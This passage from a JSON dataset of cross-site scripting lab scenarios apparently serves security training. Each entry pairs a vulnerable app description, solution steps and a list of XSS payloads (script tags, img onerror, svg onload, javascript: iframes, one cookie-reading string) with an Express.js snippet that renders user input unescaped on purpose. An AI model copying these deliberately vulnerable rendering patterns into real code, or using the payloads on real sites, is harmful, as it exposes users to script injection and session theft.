        "<img src=x onerror=alert(1)>.jpg",
        "<script>alert(1)</script>.txt",
        "<svg/onload=alert(1)>.png",
        "<iframe src='javascript:alert(1)'></iframe>.doc"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const multer = require('multer'); const upload = multer({ dest: 'uploads/' }); const app = express(); const files = []; app.post('/upload', upload.single('file'), (req, res) => { files.push(req.file.originalname); res.redirect('/files'); }); app.get('/files', (req, res) => { const list = files.map(f => `<li>${f}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Bug Tracker XSS in Issue Description Field",
      "Lab Description": "A bug tracker application allows users to report issues. Issue descriptions are rendered using innerHTML when browsing the list of open tickets. Improper handling allows attackers to inject scripts into the description. To solve: Create a bug report with a malicious description and visit the issue list.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit an issue with a crafted XSS payload in the description.",
        "Visit the issue list page.",
        "Review DOM rendering of issue data.",
        "Trigger and confirm XSS execution."
      ],
      "payloads": [
        "<script>alert('bug')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const issues = []; app.use(express.urlencoded({ extended: true })); app.post('/report', (req, res) => { issues.push(req.body.description); res.redirect('/issues'); }); app.get('/issues', (req, res) => { const list = issues.map(i => `<p>${i}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Customer Support Portal XSS in Ticket Notes",
      "Lab Description": "Support agents can add internal notes to customer tickets, which are rendered with innerHTML when viewed later. The input form allows arbitrary HTML, leading to stored XSS. To solve: Inject a script into a ticket note and revisit it to trigger execution.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Login as a support agent and submit a note with an XSS payload.",
        "Open the corresponding ticket in the support interface.",
        "Observe how the note is rendered in the DOM.",
        "Trigger the XSS payload.",
        "Confirm the script runs in the support portal context."
      ],
      "payloads": [
        "<script>alert('support')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const notes = {}; app.use(express.urlencoded({ extended: true })); app.post('/add-note', (req, res) => { notes[req.body.ticket] = req.body.note; res.redirect('/ticket?ticket=' + req.body.ticket); }); app.get('/ticket', (req, res) => { const note = notes[req.query.ticket] || ''; res.send(`<html><body><div id='note'></div><script>document.getElementById('note').innerHTML = '${note}';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Job Board Platform XSS in Company Name Field",
      "Lab Description": "A job board lets recruiters post job listings with a company name field. The listings are displayed using innerHTML without input sanitization. The application trusts the company name input. To solve: Inject a payload into the company name and view the listing to trigger execution.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Create a job listing with an XSS payload in the company name field.",
        "Access the job board listings page.",
        "Observe unsafe rendering of company name via innerHTML.",
        "Trigger the XSS payload on listing view.",
        "Confirm script execution in browser."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<script>alert('job')</script>",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const jobs = []; app.use(express.urlencoded({ extended: true })); app.post('/post-job', (req, res) => { jobs.push(req.body.company); res.redirect('/jobs'); }); app.get('/jobs', (req, res) => { const list = jobs.map(c => `<div>${c}</div>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "E-commerce Review System XSS in Review Content",
      "Lab Description": "An online store allows users to post reviews on products. The review content is displayed via innerHTML in product pages without escaping special characters. Attackers can exploit this to run arbitrary scripts. To solve: Submit a crafted review and trigger execution on the product page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Post a product review containing a malicious script.",
        "Navigate to the product details page.",
        "Review is rendered via innerHTML into the page DOM.",
        "Trigger and verify XSS execution.",
        "Validate that the payload executes in product page context."
      ],
      "payloads": [
        "<script>alert('review')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const reviews = []; app.use(express.urlencoded({ extended: true })); app.post('/submit-review', (req, res) => { reviews.push(req.body.review); res.redirect('/product'); }); app.get('/product', (req, res) => { const list = reviews.map(r => `<p>${r}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Support Chat Application XSS in Message Body",
      "Lab Description": "A live support chat displays incoming messages in real-time by appending message content via innerHTML. Inputs are not sanitized before rendering. Malicious users can send messages containing scripts. To solve: Send a crafted message to support and confirm script execution in agent's browser.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a message with an XSS payload to the support interface.",
        "Access the support panel as an agent.",
        "Chat messages are rendered using innerHTML.",
        "Trigger XSS payload from attacker-controlled message.",
        "Confirm execution of JavaScript."
      ],
      "payloads": [
        "<script>alert('chat')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const messages = []; app.use(express.urlencoded({ extended: true })); app.post('/send', (req, res) => { messages.push(req.body.message); res.redirect('/chat'); }); app.get('/chat', (req, res) => { const chat = messages.map(m => `<div>${m}</div>`).join(''); res.send(`<html><body>${chat}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Travel Blog XSS in Comment Field",
      "Lab Description": "Users can comment on blog posts in a travel site. The comment is displayed with innerHTML and stored unsanitized. An attacker can inject scripts that execute when comments are viewed. To solve: Submit a comment containing XSS and visit the blog to trigger it.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to a blog post and submit a comment with an XSS payload.",
        "Visit the blog post page as a viewer.",
        "Confirm the comment is rendered via innerHTML.",
        "Trigger the script execution.",
        "Validate the XSS occurs within the blog context."
      ],
      "payloads": [
        "<script>alert('travel')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const comments = []; app.use(express.urlencoded({ extended: true })); app.post('/comment', (req, res) => { comments.push(req.body.comment); res.redirect('/blog'); }); app.get('/blog', (req, res) => { const list = comments.map(c => `<p>${c}</p>`).join(''); res.send(`<html><body>${list}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Music Sharing Site XSS in Playlist Name",
      "Lab Description": "A music-sharing app allows users to create playlists. Playlist names are displayed using innerHTML on the main dashboard. No input sanitization is applied to the names. Attackers can use this to inject scripts. To solve: Create a malicious playlist name and view it on the dashboard.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Create a new playlist with a JavaScript payload as the name.",
        "Access the music dashboard page.",
        "Playlist name is rendered using innerHTML.",
        "Trigger and verify XSS payload execution.",
        "Confirm JavaScript runs in the app context."
      ],
      "payloads": [
        "<script>alert('playlist')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const playlists = []; app.use(express.urlencoded({ extended: true })); app.post('/create', (req, res) => { playlists.push(req.body.name); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { const list = playlists.map(p => `<li>${p}</li>`).join(''); res.send(`<html><body><ul>${list}</ul></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Fitness Tracker App XSS in Goal Title",
      "Lab Description": "A fitness tracker allows users to set custom goals with a title. The title is displayed on the user's dashboard using innerHTML without sanitization. The application reflects the goal title directly. To solve: Inject a script into a goal title and trigger it on the dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set a fitness goal with an XSS payload in the title field.",
        "Visit the dashboard to view active goals.",
        "Observe that the title is rendered using innerHTML.",
        "Trigger the payload when the dashboard loads.",
        "Confirm script execution in user context."
      ],
      "payloads": [
        "<script>alert('goal')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const goals = []; app.use(express.urlencoded({ extended: true })); app.post('/add-goal', (req, res) => { goals.push(req.body.title); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { const html = goals.map(g => `<div>${g}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Movie Review Site XSS in Reviewer Name",
      "Lab Description": "A movie site displays reviews and includes the reviewer's name using innerHTML. The name field is not sanitized, and malicious input is rendered into the DOM. To solve: Submit a crafted reviewer name and view the reviews page to execute JavaScript.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit a movie review with an XSS payload in the reviewer name field.",
        "Navigate to the reviews page.",
        "Observe unsanitized rendering using innerHTML.",
        "Trigger the injected script.",
        "Validate the XSS payload executes in page context."
      ],
      "payloads": [
        "<script>alert('reviewer')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const reviews = []; app.use(express.urlencoded({ extended: true })); app.post('/submit-review', (req, res) => { reviews.push(req.body.name); res.redirect('/reviews'); }); app.get('/reviews', (req, res) => { const html = reviews.map(n => `<p>${n}</p>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Education Portal XSS in Assignment Title",
      "Lab Description": "Teachers can post assignments with a title that is shown to students via innerHTML. The title field is not escaped or sanitized. This allows a teacher or attacker to inject scripts. To solve: Create an assignment with a payload in the title and view it as a student.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Login as a teacher and post a new assignment with a payload in the title.",
        "Access the assignments page as a student.",
        "Assignment titles are rendered using innerHTML.",
        "XSS payload is triggered in student's browser.",
        "Confirm JavaScript execution in student context."
      ],
      "payloads": [
        "<script>alert('assignment')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const assignments = []; app.use(express.urlencoded({ extended: true })); app.post('/post-assignment', (req, res) => { assignments.push(req.body.title); res.redirect('/assignments'); }); app.get('/assignments', (req, res) => { const html = assignments.map(a => `<div>${a}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Developer Forum XSS in Thread Title",
      "Lab Description": "A coding forum allows users to create discussion threads with a title. The title is displayed on the homepage using innerHTML. No sanitization is done on input. To solve: Inject a payload into a thread title and verify execution when browsing the forum.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a thread with an XSS payload in the title.",
        "Access the forum home page.",
        "Thread titles are rendered via innerHTML.",
        "Trigger XSS payload upon page load.",
        "Verify script runs in forum context."
      ],
      "payloads": [
        "<script>alert('forum')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const threads = []; app.use(express.urlencoded({ extended: true })); app.post('/new-thread', (req, res) => { threads.push(req.body.title); res.redirect('/forum'); }); app.get('/forum', (req, res) => { const html = threads.map(t => `<h3>${t}</h3>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Photography Sharing Site XSS in Album Description",
      "Lab Description": "A photo-sharing site allows users to add a description to their albums. The description is shown using innerHTML on the album page. Input is not sanitized, allowing XSS. To solve: Submit a malicious description and trigger the payload by visiting the album.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Create a photo album with an XSS payload in the description.",
        "Navigate to the album view page.",
        "Album description is rendered using innerHTML.",
        "Script executes in viewer's browser.",
        "Confirm JavaScript injection is successful."
      ],
      "payloads": [
        "<script>alert('photo')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const albums = []; app.use(express.urlencoded({ extended: true })); app.post('/create-album', (req, res) => { albums.push(req.body.description); res.redirect('/albums'); }); app.get('/albums', (req, res) => { const html = albums.map(a => `<div>${a}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "E-Commerce Platform XSS in Wishlist Item Name",
      "Lab Description": "An e-commerce site allows users to add custom item names to their wishlist. These names are rendered using innerHTML on the wishlist page without sanitization. The application does not validate HTML/JS input. To solve: Inject a script payload into the item name and trigger it via the wishlist display.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add a new wishlist item with an XSS payload in the name field.",
        "Visit the wishlist page to view stored items.",
        "Item names are rendered using innerHTML.",
        "Payload triggers automatically when page loads.",
        "Confirm script execution in the session context."
      ],
      "payloads": [
        "<script>alert('wishlist')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const items = []; app.use(express.urlencoded({ extended: true })); app.post('/add-item', (req, res) => { items.push(req.body.name); res.redirect('/wishlist'); }); app.get('/wishlist', (req, res) => { const html = items.map(i => `<li>${i}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Social Media App XSS in Bio Field",
      "Lab Description": "A social media platform allows users to update their bio. This bio is reflected on the user's public profile page using innerHTML without escaping tags. Malicious scripts can be embedded and executed. To solve: Inject a payload into the bio and trigger it on the profile page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Update your profile with an XSS payload in the bio field.",
        "Visit your public profile page.",
        "Bio is rendered using innerHTML in the HTML response.",
        "Script executes upon rendering the profile.",
        "Confirm execution of the payload in page context."
      ],
      "payloads": [
        "<script>alert('bio')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); let bio = ''; app.use(express.urlencoded({ extended: true })); app.post('/update-bio', (req, res) => { bio = req.body.bio; res.redirect('/profile'); }); app.get('/profile', (req, res) => { res.send(`<html><body><div>${bio}</div></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Travel Booking Portal XSS in Destination Notes",
      "Lab Description": "A travel app lets users add 'notes' for destinations they plan to visit. These notes are shown on a trip summary page using innerHTML. No escaping is applied, allowing JavaScript injection. To solve: Add an XSS payload to a note and access the summary page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a trip note with a payload as the content.",
        "Navigate to the trip summary page.",
        "Note is rendered using innerHTML.",
        "Payload is triggered when the summary loads.",
        "Validate that script executes in user\u00e2\u20ac\u2122s context."
      ],
      "payloads": [
        "<script>alert('trip')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const notes = []; app.use(express.urlencoded({ extended: true })); app.post('/add-note', (req, res) => { notes.push(req.body.note); res.redirect('/trip-summary'); }); app.get('/trip-summary', (req, res) => { const html = notes.map(n => `<p>${n}</p>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Food Delivery App XSS in Feedback Comments",
      "Lab Description": "Customers submit feedback with optional comments. These are displayed to admins using innerHTML. Since comments are not sanitized, a malicious user can inject JavaScript. To solve: Inject an XSS payload in the comment and trigger it in the admin interface.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a feedback form with a crafted script in the comment field.",
        "Access the admin dashboard as an admin user.",
        "Comment is rendered in a feedback log via innerHTML.",
        "Script executes automatically in the admin\u00e2\u20ac\u2122s browser.",
        "Confirm access to admin context."
      ],
      "payloads": [
        "<script>alert('admin')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const feedbacks = []; app.use(express.urlencoded({ extended: true })); app.post('/submit-feedback', (req, res) => { feedbacks.push(req.body.comment); res.redirect('/thank-you'); }); app.get('/admin-feedback', (req, res) => { const html = feedbacks.map(f => `<div>${f}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Healthcare Portal XSS in Appointment Notes",
      "Lab Description": "Doctors can leave notes for each appointment. These notes are shown on the appointment review page using innerHTML. The application does not sanitize or encode user input. To solve: Insert a script payload into a doctor's note and execute it on the review page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Add a note to a scheduled appointment with an XSS payload.",
        "Access the appointment review page.",
        "The note is injected using innerHTML without encoding.",
        "Payload is triggered in the browser.",
        "Verify the JavaScript executes successfully."
      ],
      "payloads": [
        "<script>alert('appointment')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const notes = []; app.use(express.urlencoded({ extended: true })); app.post('/add-note', (req, res) => { notes.push(req.body.note); res.redirect('/review'); }); app.get('/review', (req, res) => { const html = notes.map(n => `<div>${n}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Product Customization XSS in E-Commerce Configurator",
      "Lab Description": "An e-commerce site allows users to customize products before adding them to the cart. Custom text (e.g., engraved message) is previewed live using innerHTML inside a product detail component. The preview renderer fails to sanitize user-supplied input, leading to DOM-based XSS. To solve: Inject malicious input via the customization field to execute arbitrary JavaScript in the preview.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to a customizable product page.",
        "Enter a crafted XSS payload into the engraving/customization input.",
        "Submit and trigger the live preview mechanism.",
        "Inspect how the user input is embedded directly into the DOM using innerHTML.",
        "Observe the JavaScript alert triggered through the malicious input."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<script>alert('XSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); app.get('/product', (req, res) => { const preview = req.query.preview || 'Customize your product'; res.send(`<html><body><h1>Customize Product</h1><form method='GET'><input name='preview'><button type='submit'>Preview</button></form><div id='preview'></div><script>document.getElementById('preview').innerHTML = '${preview}';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Contact Info Display in Job Applicant Portal",
      "Lab Description": "A job portal allows applicants to preview how their submitted contact info will appear to recruiters. The application reflects submitted form values directly into a DOM container without encoding. To solve: Craft a malicious payload in the contact info form that leads to script execution when previewed.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to the application form and enter payloads in the contact info fields.",
        "Submit the form to reach the preview step.",
        "Inspect the preview feature where input is reflected into the DOM.",
        "Inject and refine payloads targeting unsafe innerHTML rendering.",
        "Observe successful JavaScript execution."
      ],
      "payloads": [
        "<iframe src=javascript:alert(1)>",
        "<video><source onerror=alert(1)>",
        "<object data='javascript:alert(1)'></object>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/apply', (req, res) => { res.send(`<form method='POST'><input name='contact'><button type='submit'>Submit</button></form>`); }); app.post('/apply', (req, res) => { const contact = req.body.contact || ''; res.send(`<html><body><h2>Preview Contact</h2><div id='preview'></div><script>document.getElementById('preview').innerHTML = '${contact}';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Search Suggestions for Real Estate Listings",
      "Lab Description": "A real estate platform offers search suggestions as users type queries. The suggestions are dynamically inserted into the page without escaping, using string concatenation with innerHTML. To solve: Inject a payload via search input that executes JavaScript when the suggestion dropdown renders.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Open the property search interface.",
        "Type a malicious payload in the search bar.",
        "Observe the suggestions box auto-populating based on the search input.",
        "Inspect how the input is embedded into the suggestions list.",
        "Trigger and verify script execution via XSS."
      ],
      "payloads": [
        "<img src=1 onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<script>alert('XSS')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const q = req.query.q || ''; res.send(`<html><body><form><input name='q'></form><div id='suggestions'></div><script>let input = '${q}'; document.getElementById('suggestions').innerHTML = '<ul><li>' + input + '</li></ul>';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Custom Notification Templates in Admin Panel",
      "Lab Description": "An admin interface allows configuration of notification templates using custom text fields. The custom message is rendered directly into a preview area using innerHTML. Due to lack of sanitization, arbitrary HTML/JS can be injected. To solve: Exploit the preview system by crafting an XSS payload as the custom message.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Login to the admin panel and open the notification editor.",
        "Submit a crafted payload as part of the custom message field.",
        "Use the preview button to observe unsafe rendering.",
        "Inspect the JavaScript logic responsible for rendering innerHTML.",
        "Trigger and confirm JavaScript execution."
      ],
      "payloads": [
        "<img src=x onerror=alert('XSS')>",
        "<marquee onstart=alert(1)>test</marquee>",
        "<svg><script>alert('XSS')</script></svg>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/admin', (req, res) => { res.send(`<form method='POST'><input name='msg'><button type='submit'>Preview</button></form>`); }); app.post('/admin', (req, res) => { const msg = req.body.msg || ''; res.send(`<html><body><h2>Notification Preview</h2><div id='notif'></div><script>document.getElementById('notif').innerHTML = '${msg}';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS via Meta Description Injection in Blog CMS",
      "Lab Description": "A blog CMS allows post authors to add custom meta descriptions. These descriptions are inserted into the DOM using JavaScript after loading the post. Due to lack of escaping, this allows DOM-based XSS. To solve: Inject a payload in the meta description that leads to execution on page load.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Login as a blog author and create/edit a post.",
        "Insert a JavaScript payload into the meta description field.",
        "Save and view the blog post.",
        "Inspect the DOM insertion using innerHTML or document.write.",
        "Confirm script execution."
      ],
      "payloads": [
        "<script>alert('meta XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); let description = ''; app.get('/new-post', (req, res) => { res.send(`<form method='POST'><input name='desc'><button type='submit'>Save</button></form>`); }); app.post('/new-post', (req, res) => { description = req.body.desc; res.redirect('/post'); }); app.get('/post', (req, res) => { res.send(`<html><body><h1>My Blog</h1><script>document.body.innerHTML += '${description}';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Personalized Finance News Feed",
      "Lab Description": "The financial application offers personalized news feeds based on user preferences. These preferences are reflected directly into the HTML without proper sanitization, allowing attackers to inject JavaScript into news headlines. To solve: Exploit the unsanitized headline rendering to execute arbitrary script when the page loads.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Access the /preferences endpoint and update the headline preference with an XSS payload.",
        "Refresh the /news-feed endpoint to trigger rendering based on the saved preference.",
        "Observe how the payload appears inside the <h2> tag or JavaScript block.",
        "Craft a working payload that fits the injection point in the DOM.",
        "Confirm that the script executes upon loading the feed."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<script>alert(document.domain)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); let preference = 'Top News'; app.use(bodyParser.urlencoded({ extended: true })); app.get('/preferences', (req, res) => { res.send(`<form method='POST' action='/preferences'><input name='headline' value='${preference}'><button>Save</button></form>`); }); app.post('/preferences', (req, res) => { preference = req.body.headline; res.redirect('/news-feed'); }); app.get('/news-feed', (req, res) => { res.send(`<html><body><h2>${preference}</h2></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in OpenID Redirect Parameter",
      "Lab Description": "An OpenID login endpoint reflects the redirect URL back to the page during error handling. Improper validation of the redirect parameter leads to an XSS sink in a script context. To solve: Inject a payload into the redirect query string and trigger script execution during login failure.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Navigate to /auth?redirect= and inject an XSS payload as the redirect target.",
        "Cause a login failure to trigger the error message containing the redirect.",
        "Observe the reflected URL in the DOM or inside a <script> block.",
        "Use console or view-source to find injection context.",
        "Confirm that the crafted redirect results in alert execution."
      ],
      "payloads": [
        "\");alert(1);//",
        "';alert(document.cookie);//",
        "`;alert('XSS')//"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect || '/dashboard'; res.send(`<html><body><script>var err = 'Invalid login, returning to ${redirect}';</script></body></html>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS in Avatar Preview Generator",
      "Lab Description": "Users can customize avatars using a generator that displays a live preview. The avatar preview is rendered with user-submitted data directly placed into an innerHTML attribute, making it vulnerable to DOM-based XSS. To solve: Inject a malicious payload in the avatar name field that results in script execution inside the preview box.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Go to /avatar-generator and submit a crafted avatar name.",
        "Review the live preview section and identify unsafe innerHTML injection.",
        "Inject payloads that break HTML structure to run scripts.",
        "Test both self-closing and non-closing tags.",
        "Confirm execution of JavaScript in the live preview section."
      ],
      "payloads": [
        "<img src=x onerror=alert(1)>",
        "<iframe src=javascript:alert('XSS')>",
        "<video><source onerror=alert('XSS')></video>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/avatar-generator', (req, res) => { res.send(`<form method='POST'><input name='name'><button>Preview</button></form>`); }); app.post('/avatar-generator', (req, res) => { const name = req.body.name; res.send(`<div id='preview'><h3>Preview</h3><div>${name}</div></div>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "XSS via Bug Report Summary in Admin Panel",
      "Lab Description": "A bug tracker application allows users to submit bug reports. The admin panel renders submitted summaries into a table with no sanitization. This enables attackers to inject JavaScript payloads that execute when an admin opens the panel. To solve: Submit a bug report with a crafted summary field that executes a script on the /admin-bugs page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a bug report through /report with an XSS payload in the summary.",
        "Login as an admin and navigate to /admin-bugs.",
        "Observe the rendering of the payload in a table cell.",
        "Craft payloads using <script>, <img>, or <svg>.",
        "Confirm successful execution in the admin context."
      ],
      "payloads": [
        "<img src=x onerror=alert('Admin XSS')>",
        "<svg/onload=alert('XSS')>",
        "<script>alert('Bug')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const reports = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/report', (req, res) => { res.send(`<form method='POST'><input name='summary'><button>Submit</button></form>`); }); app.post('/report', (req, res) => { reports.push(req.body.summary); res.redirect('/thankyou'); }); app.get('/admin-bugs', (req, res) => { const rows = reports.map(r => `<tr><td>${r}</td></tr>`).join(''); res.send(`<table>${rows}</table>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Shared Task Description",
      "Lab Description": "A collaborative to-do app allows users to share task descriptions publicly. The application renders task descriptions in the shared view using dangerouslySetInnerHTML-style rendering without sanitization. To solve: Inject a stored XSS payload in a task and access the public share page to trigger it.",
      "Difficulty Level": "High",
      "Solution Steps": [
        "Create a task with a malicious description using HTML tags.",
        "Enable public sharing via /share endpoint.",
        "Navigate to the shared link to observe task rendering.",
        "Craft payloads using <script> or HTML-based vectors.",
        "Confirm that the payload executes when another user views the task."
      ],
      "payloads": [
        "<script>alert('Task XSS')</script>",
        "<object data='javascript:alert(1)'></object>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const tasks = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/create-task', (req, res) => { tasks.push(req.body.description); res.redirect('/tasks'); }); app.get('/share', (req, res) => { const shared = tasks.map(t => `<li>${t}</li>`).join(''); res.send(`<ul>${shared}</ul>`); }); app.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS in Search Suggestion Tooltip",
      "Lab Description": "The application's search feature includes a tooltip showing the last searched term. The tooltip is updated using innerHTML directly from the URL parameter without proper encoding. To solve: Inject a payload via the `term` query string to trigger JavaScript execution when the tooltip renders.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to /search?term= with a test string to inspect rendering.",
